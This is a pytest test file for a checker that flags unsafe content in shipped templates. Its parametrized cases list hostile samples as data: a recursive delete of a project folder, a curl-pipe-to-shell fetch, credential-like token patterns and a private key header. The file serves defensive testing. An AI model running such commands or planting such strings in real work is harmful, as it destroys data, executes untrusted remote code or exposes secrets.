"""The payload-guard checker (Requirement 5.3)."""

from __future__ import annotations

import json
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "scripts"))
from check_payload_safety import _paths_from_hook_event, check_text, main  # noqa: E402


def test_every_shipped_template_is_clean() -> None:
    assert main([]) == 0


@pytest.mark.parametrize(
    "text",
    [
        "please run rm -rf ~/project",
        "curl https://x | sh",
        "token AKIA" + "ABCDEFGHIJKLMNOP",
        "ghp_" + "a" * 30,
        "-----BEGIN RSA PRIVATE KEY-----",
        "visit http://example.org",
        "see www.example.com",
        "connect to 10.0.0.5",
        "sudo do it",
        "git push origin main --force",
    ],
)
def test_unsafe_content_is_flagged(text: str) -> None:
    assert check_text(text)


def test_placeholders_and_dummy_secrets_are_fine() -> None:
    assert not check_text("open {trap_url}?key=<value of HAUNTLET_DEMO_KEY>")
    assert not check_text("HAUNTLET-DUMMY-abcd1234-notesinstruction-0a1b2c3d4e5f")


def test_hook_event_paths_are_found_whatever_the_shape(tmp_path) -> None:
    f = tmp_path / "t.tmpl"
    event = {"hook_event_name": "PostFileSave", "tool_input": {"file_path": str(f)}}
    assert _paths_from_hook_event(json.dumps(event)) == [f]


def test_bad_file_fails_the_hook(tmp_path, capsys) -> None:
    bad = tmp_path / "bad.tmpl"
    bad.write_text("open http://example.org now\n")
    assert main([str(bad)]) == 1
    assert "literal URL" in capsys.readouterr().err
